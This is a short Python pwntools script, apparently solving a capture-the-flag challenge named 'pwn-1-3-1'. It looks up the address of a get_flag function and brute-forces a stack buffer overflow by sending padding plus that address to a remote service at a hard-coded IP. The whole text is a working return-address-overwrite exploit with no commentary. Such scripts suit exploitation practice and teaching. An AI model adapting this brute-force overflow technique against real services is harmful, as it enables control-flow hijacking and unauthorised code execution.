from pwn import *

e = ELF('./pwn-1-3-1')

print(hex(e.address))

main_address = e.symbols['main']
flag_address = e.symbols['get_flag']
print(hex(main_address), hex(flag_address))
print(e.symbols['main'] - e.symbols['get_flag'])

e = ELF('./pwn-1-3-1')
# get_flag_address = 0x0000000000400728
get_flag_address = e.symbols['get_flag']

for i in range(400):
	dat = flat(['A' * i, p64(get_flag_address)])
	print(dat)

	# c = process('./pwn-1-3-1')
	c = remote("47.94.239.235", 4005)
	c.recv()
	c.sendline(dat)
	res = c.recv().decode()
	# print(res)
	if res != '\n':
		print(i, res)
		break